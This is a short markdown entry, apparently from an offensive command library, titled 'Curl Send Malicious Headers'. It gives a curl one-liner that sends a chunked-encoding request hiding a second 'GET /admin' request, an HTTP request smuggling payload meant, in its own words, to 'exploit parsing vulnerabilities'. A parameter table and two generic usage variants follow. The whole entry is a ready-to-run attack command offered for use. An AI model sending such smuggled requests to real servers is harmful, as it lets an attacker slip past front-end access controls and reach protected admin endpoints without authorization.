---
data: >-
  curl -H "Transfer-Encoding: chunked" -H "Foo: bar" --data "0\r\n\r\nGET /admin
  HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com
tags:
  - http
  - smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: de7165ff-b37f-4852-afe1-8481e68cae0c
created_at: '2025-12-13T09:01:17.714Z'
updated_at: '2025-12-13T09:01:17.714Z'
verified: false
validated: true
submitted: true
---
# Curl Send Malicious Headers

## Command

```bash
curl -H "Transfer-Encoding: chunked" -H "Foo: bar" --data "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com
```

## Description

Sends a crafted HTTP request with chunked encoding and smuggled content to exploit parsing vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Add custom headers | Yes |
| `--data` | POST data with smuggling payload | Yes |
| `http://target.com` | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl -H "Transfer-Encoding: chunked" --data "payload" http://example.com
```

### Advanced Usage

```bash
curl -v -H "Custom-Header: value" --data "smuggled-request" http://example.com
```

## Expected Output

Verbose output showing request sent and server response.

## Related

- [[procedures/Craft-Malicious-HTTP-Request]]
